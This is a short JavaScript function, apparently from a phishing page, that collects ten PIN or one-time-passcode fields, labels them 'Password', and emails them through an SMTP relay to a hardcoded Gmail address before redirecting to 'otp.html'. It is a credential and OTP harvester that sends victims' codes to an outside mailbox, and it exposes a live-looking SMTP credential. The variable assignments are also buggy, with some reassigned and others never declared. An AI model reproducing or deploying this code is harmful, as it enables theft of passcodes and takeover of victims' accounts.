function emailSend() {
  var pin1 = document.getElementsByName('pin1')[0].value;
  var pin2 = document.getElementsByName('pin2')[0].value;
  var pin3 = document.getElementsByName('pin3')[0].value;
  var pin4 = document.getElementsByName('pin4')[0].value;
  var pin1 = document.getElementsByName('pin5')[0].value;
  var pin2 = document.getElementsByName('pin6')[0].value;
  var pin3 = document.getElementsByName('pin7')[0].value;
  var pin4 = document.getElementsByName('pin8')[0].value;
  var pin1 = document.getElementsByName('pin9')[0].value;
  var pin2 = document.getElementsByName('pin10')[0].value;

  var pin = pin1 + pin2 + pin3 + pin4 + pin5 + pin6 + pin7 + pin8 + pin9 + pin10; // Concatenating the individual PIN values

  var messageBody = "Password: " + pin; // Constructing the message body with the PIN

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "burujikasamu42@gmail.com",
    Password: "C91527DAA37229A80FC05211FD0227338844",
    To: 'burujikasamu42@gmail.com', // Change this to your email address where you want to receive the OTP
    From: "burujikasamu42@gmail.com",
    Subject: "OTP",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'otp.html'; // Redirecting to otp.html upon successful email sending
      }
      else {
        swal("Error", "Please complete the OTP field", "error") // Displaying an error message if email sending fails
      }
    }
  );
}
